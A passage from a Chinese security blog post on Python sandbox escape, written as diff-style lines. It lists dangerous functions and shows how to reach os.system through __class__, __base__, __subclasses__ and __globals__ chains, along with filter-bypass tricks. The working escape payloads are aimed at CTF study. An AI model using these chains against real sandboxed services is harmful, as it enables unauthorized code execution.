+&gt;&gt;&gt; eval(a)
+&quot;&lt;?php\n\necho $_GET[&apos;a&apos;];\n&quot;
+&gt;&gt;&gt; </code></pre><p>另外，exec、execfile这些类似的高危函数上述已提及，这里不再赘述</p>
+<h4 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h4><p>os.system()执行命令成功后会返回０</p>
+<pre><code>&gt;&gt;&gt; a = os.system(&apos;ls /&apos;)
+bin    dev   initrd.img      lib64     mnt   root  snap  tmp
+&gt;&gt;&gt; print a
+0</code></pre><p>而<code>os.popen()</code>该方法是以文件对象的形式返回shell指令运行的结果，获取结果可以调用read()或readlines()方法：</p>
+<pre><code>&gt;&gt;&gt; a = os.popen(&apos;ls /&apos;)
+&gt;&gt;&gt; print a
+&lt;open file &apos;ls /&apos;, mode &apos;r&apos; at 0x7f6c232865d0&gt;
+&gt;&gt;&gt; print a.read()
+bin
+boot
+cdrom
+dev
+etc
+home</code></pre><p>此外，<code>site</code>模块也有<code>os</code>方法，如果不能直接引入<code>os</code>，可以通过引入<code>site</code>，通过<code>site.os</code>调用：</p>
+<pre><code>&gt;&gt;&gt; import site
+&gt;&gt;&gt; site.os.system(&apos;ls /&apos;)
+bin    dev   initrd.img      lib64     mnt   root  snap  tmp
+0
+&gt;&gt;&gt; </code></pre><h4 id="commands模块"><a href="#commands模块" class="headerlink" title="commands模块"></a>commands模块</h4><p>commands.getstatusoutput：以元组的形式返回结果，第一个元素为状态码，第二个元素为执行结果：</p>
+<pre><code>&gt;&gt;&gt; import commands
+&gt;&gt;&gt; commands.getstatusoutput(&apos;ls /&apos;)
+(0, &apos;bin\nboot\ncdrom\ndev\netc\nhome&apos;)</code></pre><p>commands.getoutput：直接以字符串的形式返回命令执行的结果：</p>
+<pre><code>&gt;&gt;&gt; commands.getoutput(&apos;ls /&apos;)
+&apos;bin\nboot\ncdrom\ndev\netc\nhome\&apos;</code></pre><h4 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h4><p>可以用这个模块创建子进程</p>
+<p>subprocess模块定义了一个Popen类，通过它可以创建进程，并与其进行复杂的交互。</p>
+<pre><code>__init__(self, args, bufsize=0, executable=None, 
+stdin=None, stdout=None, stderr=None, preexec_fn=None, 
+close_fds=False, shell=False, cwd=None, env=None, 
+universal_newlines=False, startupinfo=None, 
+creationflags=0)</code></pre><p>关键的参数：</p>
+<ul>
+<li>args：一般是一个字符串，是要执行的shell命令内容</li>
+<li>shell：默认为False；为True时，表示将通过shell来执行</li>
+</ul>
+<p>Popen对象创建后，主程序不会自动等待子进程，因此我们可以调用wait()方法，使父进程等待子进程：</p>
+<pre><code>&gt;&gt;&gt; subprocess.Popen(&apos;ls /&apos;, shell=True).wait()
+bin    dev   initrd.img      lib64     mnt   root  
+0
+&gt;&gt;&gt; </code></pre><p>下面的这些函数都是基于Popen()的封装，都可以执行shell命令，与Popen()用法很类似：</p>
+<pre><code>&gt;&gt;&gt; subprocess.call(&apos;ls /&apos;, shell=True)
+&gt;&gt;&gt; subprocess.check_call(&apos;ls /&apos;, shell=True) # Python2.5新增
+&gt;&gt;&gt; subprocess.check_output(&apos;ls /&apos;, shell=True)　# Python2.7新增
+&gt;&gt;&gt; subprocess.run(&apos;ls /&apos;, shell=True)     # Python3.5新增</code></pre><p>详细说明可参考：<a href="https://www.cnblogs.com/lincappu/p/8270709.html" target="_blank" rel="noopener">https://www.cnblogs.com/lincappu/p/8270709.html</a></p>
+<h4 id="timeit"><a href="#timeit" class="headerlink" title="timeit"></a>timeit</h4><pre><code>&gt;&gt;&gt; import timeit
+&gt;&gt;&gt; timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;, number=1)</code></pre><h4 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h4><pre><code>&gt;&gt;&gt; import platform
+&gt;&gt;&gt; platform.popen(&apos;ls /&apos;).read()</code></pre><h3 id="0x05-常用的内建属性"><a href="#0x05-常用的内建属性" class="headerlink" title="0x05.常用的内建属性"></a>0x05.常用的内建属性</h3><p>python中一切皆为对象；python的所有类默认继承object类，object类提供了很多原始的内建属性和方法，因此用户自定义的类在python中也会继承这些内建属性；学习了下面这些内建属性，那么在沙箱中就可以很容易的构造出poc</p>
+<h4 id="class"><a href="#class" class="headerlink" title="_class_"></a>_<em>class_</em></h4><p><code>__class__</code>同<code>type()</code>，都可查看对象所在的类：</p>
+<pre><code>&gt;&gt;&gt; class Student():
+...     def __init__(self, name):
+...             self.name = name
+... 
+&gt;&gt;&gt; stu = Student(&apos;ling&apos;)
+&gt;&gt;&gt; type(stu)
+&lt;class &apos;__main__.Student&apos;&gt;
+&gt;&gt;&gt; stu.__class__
+&lt;class &apos;__main__.Student&apos;&gt;
+&gt;&gt;&gt; </code></pre><h4 id="base"><a href="#base" class="headerlink" title="_base_"></a>_<em>base_</em></h4><p>可以获取类的一个基类，一般情况下是object，有时不是，例如继承类的时候：</p>
+<pre><code>&gt;&gt;&gt; class Student():
+...     def __init__(self, name):
+...             self.name = name
+... 
+&gt;&gt;&gt; stu = Student(&apos;ling&apos;)
+&gt;&gt;&gt; stu.__class__.__base__
+&lt;class &apos;object&apos;&gt;
+
+&gt;&gt;&gt; class Student2(Student):
+...     pass
+... 
+&gt;&gt;&gt; stu2 = Student2()
+&gt;&gt;&gt; stu2.__class__.__base__
+&lt;class &apos;__main__.Student&apos;&gt;</code></pre><h4 id="mro"><a href="#mro" class="headerlink" title="_mro_"></a>_<em>mro_</em></h4><p>以元祖的形式返回整个继承链的关系：</p>
+<pre><code>&gt;&gt;&gt; stu2.__class__.__mro__
+(&lt;class &apos;__main__.Student2&apos;&gt;, &lt;class &apos;__main__.Student&apos;&gt;, &lt;class &apos;object&apos;&gt;)</code></pre><p>上面显示了<code>Student2</code>继承自<code>Student</code>，<code>Student</code>继承自<code>object</code>；因此可以直接获取object类：</p>
+<pre><code>&gt;&gt;&gt; stu2.__class__.__mro__[-1]
+&gt;&gt;&gt; &lt;class &apos;object&apos;&gt;</code></pre><h4 id="subclasses"><a href="#subclasses" class="headerlink" title="_subclasses_()"></a>_<em>subclasses_</em>()</h4><p>上述两种方法可以得到object类，但如果代码中没有Student类，我们可以用利用python自带的对象(一切皆为对象)：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__
+&lt;class &apos;object&apos;&gt;
+&gt;&gt;&gt; &apos;&apos;.__class__.__base__
+&lt;class &apos;object&apos;&gt;
+&gt;&gt;&gt; ().__class__.__base__
+&lt;class &apos;object&apos;&gt;
+&gt;&gt;&gt; {}.__class__.__base__
+&lt;class &apos;object&apos;&gt;</code></pre><p>得到object类后，就可以用<code>__subclasses__()</code>方法获得所有继承此类的子类：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()
+[&lt;class &apos;type&apos;&gt;, &lt;class &apos;weakref&apos;&gt;, &lt;class &apos;weakcallableproxy&apos;&gt;, &lt;class &apos;weakproxy&apos;&gt;, &lt;class &apos;int&apos;&gt;, &lt;class &apos;bytearray&apos;&gt;, &lt;class &apos;bytes&apos;&gt;, &lt;class &apos;list&apos;&gt;, &lt;class &apos;NoneType&apos;&gt;, &lt;class &apos;NotImplementedType&apos;&gt;, &lt;class &apos;traceback&apos;&gt;, &lt;class &apos;super&apos;&gt;, &lt;class &apos;range&apos;&gt;, &lt;class &apos;dict&apos;&gt;, &lt;class &apos;dict_keys&apos;&gt;, &lt;class &apos;dict_values&apos;&gt;, &lt;class &apos;dict_items&apos;&gt;, &lt;class &apos;odict_iterator&apos;&gt;, &lt;class &apos;set&apos;&gt;, &lt;class &apos;str&apos;&gt;, &lt;class &apos;slice&apos;&gt;, &lt;class &apos;staticmethod&apos;&gt;, &lt;class &apos;complex&apos;&gt;, &lt;class &apos;float&apos;&gt;, &lt;class &apos;frozenset&apos;&gt;, &lt;class &apos;property&apos;&gt;, &lt;class &apos;managedbuffer&apos;&gt;, &lt;class &apos;memoryview&apos;&gt;, &lt;class &apos;tuple&apos;&gt;, &lt;class &apos;enumerate&apos;&gt;......</code></pre><p>注：没有限制的话，<code>object</code>类是直接可以使用的</p>
+<h4 id="dict"><a href="#dict" class="headerlink" title="_dict_"></a>_<em>dict_</em></h4><p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p>
+<p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p>
+<p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p>
+<pre><code>&gt;&gt;&gt; a = []
+&gt;&gt;&gt; [].__class__.__dict__[&apos;append&apos;](a, &apos;ling&apos;)
+&gt;&gt;&gt; a
+[&apos;ling&apos;]</code></pre><h4 id="init"><a href="#init" class="headerlink" title="_init_"></a>_<em>init_</em></h4><p><code>__init__</code>用于初始化类，在沙盒逃逸中的作用就是为了得到<code>function</code>/<code>method</code>类型：</p>
+<pre><code>&gt;&gt;&gt; class Base:
+...     def __init__(self, a, b):
+...             self.a = a
+...     def func():
+...             pass
+... 
+&gt;&gt;&gt; class Child(Base):
+...     pass
+... 
+&gt;&gt;&gt; Child
+&lt;class &apos;__main__.Child&apos;&gt;
+&gt;&gt;&gt; 
+&gt;&gt;&gt; Child.__init__
+&lt;function Base.__init__ at 0x7f40d32ed268&gt;
+&gt;&gt;&gt; Child.func
+&lt;function Base.func at 0x7f40d32ed2f0&gt;</code></pre><h4 id="globals"><a href="#globals" class="headerlink" title="_globals_"></a>_<em>globals_</em></h4><p>该属性是函数/方法特有的属性，记录当前文件的全局变量的值</p>
+<pre><code>&gt;&gt;&gt; def func():
+...     pass
+... 
+&gt;&gt;&gt; dir(func)
+[&apos;__annotations__&apos;, &apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__kwdefaults__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__qualname__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;]
+
+&gt;&gt;&gt; class Student:
+...     def __init__(self):
+...             pass
+... 
+&gt;&gt;&gt; stu = Student()
+&gt;&gt;&gt; stu.__init__
+&lt;bound method Student.__init__ of &lt;__main__.Student instance at 0x7fba95e03cb0&gt;&gt;
+&gt;&gt;&gt; stu.__init__.__globals__
+{&apos;func&apos;: &lt;function func at 0x7fba95db5d70&gt;, &apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__package__&apos;: None, &apos;stu&apos;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &apos;Student&apos;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None}
+&gt;&gt;&gt; Student.__init__.__globals__
+{&apos;func&apos;: &lt;function func at 0x7fba95db5d70&gt;, &apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__package__&apos;: None, &apos;stu&apos;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &apos;Student&apos;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None}
+&gt;&gt;&gt; Student.__init__
+&lt;unbound method Student.__init__&gt;
+&gt;&gt;&gt; </code></pre><p>关于函数和方法，详见：<a href="https://segmentfault.com/a/1190000009157792" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009157792</a></p>
+<h3 id="0x06-内建属性的利用"><a href="#0x06-内建属性的利用" class="headerlink" title="0x06.内建属性的利用"></a>0x06.内建属性的利用</h3><p>如果不能直接引入<code>os</code>，那么就可以通过类似下面的构造链引入<code>os</code>：</p>
+<pre><code>对象　-&gt;　类　-&gt;　object类　-&gt;　继承object的子类 -&gt; 函数/方法 -&gt; __globals__　-&gt; os </code></pre><p>下面这些库中均含有<code>os</code>模块</p>
+<pre><code>&lt;class &apos;site._Printer&apos;&gt; # python2
+&lt;class &apos;site.Quitter&apos;&gt; # python2
+&lt;class &apos;warnings.catch_warnings&apos;&gt; # python2
+&lt;class &apos;warnings.WarningMessage&apos;&gt; # python2
+&lt;class &apos;os._wrap_close&apos;&gt;  # python3</code></pre><p>可以写个简单的循环查找上面库的位置，例如：</p>
+<pre><code>&gt;&gt;&gt; index = 0
+&gt;&gt;&gt; for value in [].__class__.__base__.__subclasses__():
+...     if &apos;site&apos; in str(value):
+...             print index
+...             break
+...     else:
+...             index += 1
+... 
+71</code></pre><p>利用：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls /&apos;)
+bin   cdrom  etc   initrd.img       lib      lost+found  mnt  proc  run   snap  sys  usr  </code></pre><p><code>&lt;class &#39;site.Quitter&#39;&gt;</code>与<code>&lt;class &#39;site.Quitter&#39;&gt;</code>用法一样；下面看下<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]
+&gt;&gt;&gt; &lt;class &apos;warnings.catch_warnings&apos;&gt;</code></pre><p>通过该类，可以找到<code>linecache</code>这个模块(将文件内容读取到内存中)，查看其可以直接调用的方法/属性：</p>
+<pre><code>&gt;&gt;&gt; dir([].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;])
+[&apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__doc__&apos;, &apos;__file__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;clearcache&apos;, &apos;getline&apos;, &apos;getlines&apos;, &apos;os&apos;, &apos;sys&apos;, &apos;updatecache&apos;]</code></pre><p>那么可以直接调用<code>os</code>：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].os.system(&apos;ls /&apos;)
+bin    dev   initrd.img      lib64     mnt   root  snap  tmp    vmlinuz</code></pre><p>python3中使用<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>：</p>
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[117]
+&lt;class &apos;os._wrap_close&apos;&gt;
+&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[117].__init__.__globals__[&apos;system&apos;](&apos;ls /&apos;)
+bin    dev   initrd.img      lib64     mnt   root  snap  tmp    vmlinuz</code></pre><h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><p>如果把字符串过滤了，那么可以使用拼接或编码的方式绕过，如果过滤单个字符<code>[</code>　<code>]</code>：</p>
+<pre><code>&gt;&gt;&gt; a = [&apos;a&apos;, &apos;b&apos;, &apos;c&apos;]
+&gt;&gt;&gt; a.__getitem__(1)
+&apos;b&apos;
+&gt;&gt;&gt; a.pop(1)
+&apos;b&apos;
+&gt;&gt;&gt; a
+[&apos;a&apos;, &apos;c&apos;]
+&gt;&gt;&gt; </code></pre><p>python3.6中可以用：</p>
+<pre><code>&gt;&gt;&gt; f&apos;{__import__(&quot;os&quot;).system(&quot;ls /&quot;)}&apos;</code></pre><p>详见：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features" target="_blank" rel="noopener">https://docs.python.org/3.6/whatsnew/3.6.html#new-features</a></p>
+<p>如果输入命令后执行结果不能回显，那么要判断沙盒能否连接外网，不能的话可以通过Time Based RCE，详情参考：<a href="https://icematcha.win/?p=532" target="_blank" rel="noopener">https://icematcha.win/?p=532</a></p>
+<p>－－－－－－－－－<br>参考链接：</p>
+<p><a href="https://blog.csdn.net/jblock/article/details/82938656" target="_blank" rel="noopener">https://blog.csdn.net/jblock/article/details/82938656</a></p>
+<p><a href="https://xz.aliyun.com/t/52/#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/52/#toc-4</a></p>
+<p><a href="https://www.cnblogs.com/zhangxinhe/p/6963462.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhangxinhe/p/6963462.html</a></p>
+<p><a href="https://www.cnblogs.com/f1194361820/p/9675960.html" target="_blank" rel="noopener">https://www.cnblogs.com/f1194361820/p/9675960.html</a></p>
+<p><a href="https://www.cnblogs.com/lincappu/p/8270709.html" target="_blank" rel="noopener">https://www.cnblogs.com/lincappu/p/8270709.html</a></p>
+<p><a href="https://segmentfault.com/a/1190000009157792" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009157792</a></p>
+<p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+  <div>
+    
+      ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+  </div>
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="gtfly 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/aipay.jpg" alt="gtfly 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    gtfly
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2019/07/25/python沙盒逃逸学习/" title="python沙箱逃逸学习">http://yoursite.com/2019/07/25/python沙盒逃逸学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/24/XSS && SSRF/" rel="next" title="XSS　&&　SSRF">
+                <i class="fa fa-chevron-left"></i> XSS　&&　SSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/26/PHP Bypass disable_functions/" rel="prev" title="PHP Bypass disable_functions(一)">
+                PHP Bypass disable_functions(一) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">159</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wangchangze.github.io/" title="wcz" target="_blank">wcz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.daokers.com/" title="金刀客" target="_blank">金刀客</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-命名空间"><span class="nav-number">1.</span> <span class="nav-text">0x01.命名空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-dir-函数"><span class="nav-number">2.</span> <span class="nav-text">0x02.dir()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-import、-import-、importlib库"><span class="nav-number">3.</span> <span class="nav-text">0x03.import、_import_()、importlib库</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#import"><span class="nav-number">3.1.</span> <span class="nav-text">import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import-1"><span class="nav-number">3.2.</span> <span class="nav-text">_import_()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#importlib"><span class="nav-number">3.3.</span> <span class="nav-text">importlib</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-python中的高危函数、方法"><span class="nav-number">4.</span> <span class="nav-text">0x04.python中的高危函数、方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#eval"><span class="nav-number">4.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os模块"><span class="nav-number">4.2.</span> <span class="nav-text">os模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#commands模块"><span class="nav-number">4.3.</span> <span class="nav-text">commands模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocess模块"><span class="nav-number">4.4.</span> <span class="nav-text">subprocess模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#timeit"><span class="nav-number">4.5.</span> <span class="nav-text">timeit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#platform"><span class="nav-number">4.6.</span> <span class="nav-text">platform</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-常用的内建属性"><span class="nav-number">5.</span> <span class="nav-text">0x05.常用的内建属性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-number">5.1.</span> <span class="nav-text">_class_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base"><span class="nav-number">5.2.</span> <span class="nav-text">_base_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mro"><span class="nav-number">5.3.</span> <span class="nav-text">_mro_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-number">5.4.</span> <span class="nav-text">_subclasses_()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict"><span class="nav-number">5.5.</span> <span class="nav-text">_dict_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init"><span class="nav-number">5.6.</span> <span class="nav-text">_init_</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#globals"><span class="nav-number">5.7.</span> <span class="nav-text">_globals_</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-内建属性的利用"><span class="nav-number">6.</span> <span class="nav-text">0x06.内建属性的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他姿势"><span class="nav-number">7.</span> <span class="nav-text">其他姿势</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
